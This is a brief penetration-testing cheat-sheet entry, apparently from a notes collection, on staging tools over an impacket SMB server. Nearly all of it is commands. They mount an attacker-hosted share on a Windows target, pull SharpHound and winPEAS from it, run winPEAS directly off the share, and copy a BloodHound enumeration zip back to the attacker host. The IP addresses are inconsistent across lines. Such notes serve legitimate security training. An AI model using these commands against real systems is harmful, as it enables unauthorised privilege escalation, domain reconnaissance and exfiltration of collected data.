---
title: impacket-smbserver - Stage Files and Run In-Memory
category: privesc
subcategory: windows-misc
os: linux, windows
command: impacket-smbserver share ./ -smb2support
tools: impacket-smbserver
---


### Anonymous share

```bash
impacket-smbserver share ./ -smb2support
```

### With user (avoids guest-block GPO)

```bash
impacket-smbserver share ./ -smb2support -user test -pass ""
```

### Mount on the Windows target

```cmd
net use \\192.168.119.231\share /USER:test
```

### Use the share from Windows

```cmd
copy \\192.168.168.168\share\SharpHound.exe
\\192.168.168.168\share\winPEASany.exe
copy 20220424074629_BloodHound.zip \\192.168.119.213\share
net use * /del /y
```
